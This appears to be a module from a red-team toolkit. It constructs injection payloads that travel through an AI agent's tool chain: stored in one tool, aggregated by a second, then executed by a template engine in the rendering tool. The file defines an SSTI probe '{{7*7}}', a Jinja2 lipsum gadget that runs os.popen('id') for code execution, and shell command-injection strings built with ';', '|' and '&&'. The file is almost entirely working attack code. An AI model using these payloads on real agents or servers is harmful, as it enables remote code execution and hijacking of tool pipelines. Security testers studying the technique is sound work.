#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""工具链注入载荷构造（mcp-11）：store→aggregate→render 三阶段。

对齐 Ch7 §7.3「Tool Chaining」：载荷存入早期工具的自由文本字段，
经聚合工具传递，在渲染工具处被模板引擎解释执行；先用无害探针
`{{7*7}}` 确认执行面（期望回显 49），再升级敏感表达式。

本模块只构造字符串载荷与判定回显，不引入 Jinja2 等三方运行时依赖
（调研 U-7/U-8；lipsum gadget 标注为社区技术）。
"""
from dataclasses import dataclass
from typing import Any, Dict, List, Optional

STAGES = ("store", "aggregate", "render")
PROBE_EXPR = "{{7*7}}"
PROBE_EXPECTED = "49"
GADGET_KEYS = "{{ lipsum.__globals__.keys() }}"
GADGET_EXEC = "{{ lipsum.__globals__['os'].popen('id').read() }}"
CMD_SEPARATORS = (";", "|", "&&")


@dataclass(frozen=True)
class ChainStep:
    """一个工具链阶段。"""

    stage: str
    tool: str
    payload: str

    def as_dict(self):
        return {"stage": self.stage, "tool": self.tool, "payload": self.payload}


def build_chain(store_tool: str, aggregate_tool: str, render_tool: str,
                payload: str) -> List[ChainStep]:
    """构造 store→aggregate→render 三阶段载荷链。"""
    if not payload:
        return []
    return [
        ChainStep("store", store_tool, payload),
        ChainStep("aggregate", aggregate_tool, "aggregate staged tickets verbatim"),
        ChainStep("render", render_tool, "render aggregated summary as template"),
    ]


def ssti_probe(expr: str = PROBE_EXPR) -> str:
    """返回探针表达式（供目标侧执行；期望回显 PROBE_EXPECTED）。"""
    return expr


def probe_confirmed(observation_text: str, expected: str = PROBE_EXPECTED) -> bool:
    """判定探针是否确认渲染端执行面（回显含期望值）。"""
    return expected in (observation_text or "")


def cmd_inject(sep: str = ";", cmd: str = "id") -> str:
    """构造命令注入载荷（下游工具将聚合数据送入 shell 时）。"""
    if sep not in CMD_SEPARATORS:
        sep = CMD_SEPARATORS[0]
    return "summary %s %s" % (sep, cmd)


def chain_as_dict(steps: List[ChainStep]) -> Dict[str, Any]:
    return {"stages": [s.as_dict() for s in steps],
            "probe": PROBE_EXPR, "probe_expected": PROBE_EXPECTED,
            "gadget_note": "lipsum.__globals__ 为社区公开 gadget，权威依据 OWASP WSTG-INPV-18"}
